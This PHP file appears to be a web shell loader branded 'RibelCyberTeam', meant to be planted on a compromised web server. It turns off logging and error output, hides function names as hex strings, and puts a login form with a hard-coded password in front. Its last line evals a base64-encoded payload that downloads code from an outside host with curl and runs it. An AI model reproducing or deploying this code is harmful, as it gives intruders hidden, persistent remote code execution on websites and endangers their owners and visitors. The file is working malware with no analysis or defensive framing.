<?php 
header("X-XSS-Protection: 0");
ob_start();set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);
$Array = [
// $GLOBALS['fungsi'][0]
  '66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
  '69735f646972', // i s _ d i r => 1
  '66696c655f7075745f636f6e74656e7473', // f i l e p u t c o n t e n t s  => 2
  '69735f66696c65', // i s _ f i l e => 3
  '756e6c696e6b', // u n l i n k => 4
  '66756E6374696F6E5F657869737473', // f u n c t i o n _ e x i s t s => 5
  '6261736536345F656E636F6465', // b a s e 6 4 _ d e c o d e => 6
  '676574637764' // g e t c w d => 7
];
  $hitung_array = count($Array);
  for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
  }
  error_reporting(0);
  @clearstatcache();
  @mb_internal_encoding('UTF-8');
  set_time_limit(0);
  @ini_set('error_log',null);
  @ini_set('log_errors',0);
  @ini_set('max_execution_time',0);
  @ini_set('output_buffering',0);
  @ini_set('display_errors', 0);
  @ini_set('disable_functions', 0);
  session_start();
  date_default_timezone_set("Asia/Jakarta");
  $_7 = array_merge($_POST, $_GET);
  $_r = "required='required'";
  $gcw = "getcwd";
  $correctPassword = "Hoki112233@Aa"; //Change Password
  if (isset($_POST['pass'])) {
    $enteredPassword = $_POST['pass'];

    if ($enteredPassword === $correctPassword) {
      $_SESSION['forbidden'] = true;
    } else {
      echo '<script>alert("Password Wrong!, Try Again.");</script>';
    }
  }
  if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit();
  }
  if (!isset($_SESSION['forbidden'])) {
  ?>
  <!DOCTYPE html>
  <html>
  <head>
  <title>-=[ RibelCyberTeam ]=-</title>
  <link rel='icon' href='https://raw.githubusercontent.com/Mr-7Mind/BahanShell/main/hehe.png'>
  <meta name="theme color" content="#00BFFF">
  <script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
  </head>
  <style>
    body {
        background-image: url("https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif");
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center;
        height: 100vh;
        margin: 0;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background-color: black;
    }

    h1 {
        color: #00BFFF;
    }

    img {
        opacity: 0.5;
        width: 200px;
        height: 300px;
    }

    form {
        text-align: center;
        margin-top: 20px;
    }

    input[type="password"] {
        padding: 5px;
    }

    input[type="submit"] {
        background-color: #00BFFF;
        color: white;
        border: none;
        padding: 5px 10px;
        cursor: pointer;
    }
  </style>
  <body>
  <form method="post">
      <input placeholder="password" type="password" name="pass" required>
      <input type="submit" name="watching" value="GO IN!">
    </form>
  </body>
  </html>
  <?php
  exit;
  }
  ?>
<?php eval("?>".base64_decode("PD9waHAgDQokdXJsID0gImh0dHBzOi8vd3AtYmFja3VwLmxvbC9qYW5nYW5vbS9kb3IvbmdhcmVwLnR4dCI7DQokY2ggPSBjdXJsX2luaXQoJHVybCk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsNCmV2YWwoIj8+Ii4kcmVzdWx0KTsNCg0KPz4=")); ?>a
